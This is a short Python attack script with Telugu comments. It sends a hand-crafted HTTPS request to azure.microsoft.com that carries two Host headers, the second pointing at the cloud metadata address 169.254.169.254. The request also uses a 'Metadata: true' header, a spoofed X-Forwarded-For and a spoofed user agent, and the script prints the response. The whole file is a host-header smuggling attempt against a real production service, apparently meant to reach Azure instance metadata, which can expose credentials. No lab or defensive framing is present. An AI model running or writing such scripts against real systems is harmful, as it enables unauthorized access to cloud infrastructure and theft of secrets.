import socket
import ssl

host = "azure.microsoft.com"
port = 443

# 2030 Double Host Smuggling Payload
# మొదటి Host అకామాయ్ కోసం, రెండో Host అజూర్ బ్యాకెండ్ కోసం
payload = (
    "GET /metadata/instance?api-version=2021-02-01 HTTP/1.1\r\n"
    "Host: azure.microsoft.com\r\n"
    "Host: 169.254.169.254\r\n" # అదనపు హోస్ట్ హెడర్
    "Metadata: true\r\n"
    "X-Forwarded-For: 131.107.255.255\r\n"
    "User-Agent: Microsoft NCSI\r\n"
    "Connection: close\r\n"
    "\r\n"
)

context = ssl.create_default_context()
try:
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"🚀 Deploying Double-Host Smuggling...")
            ssock.sendall(payload.encode())
            
            res = b""
            ssock.settimeout(10)
            while True:
                try:
                    data = ssock.recv(4096)
                    if not data: break
                    res += data
                except: break
            
            print("\n📥 Response Received:")
            print(res.decode(errors='ignore'))
except Exception as e:
    print(f"❌ Error: {e}")
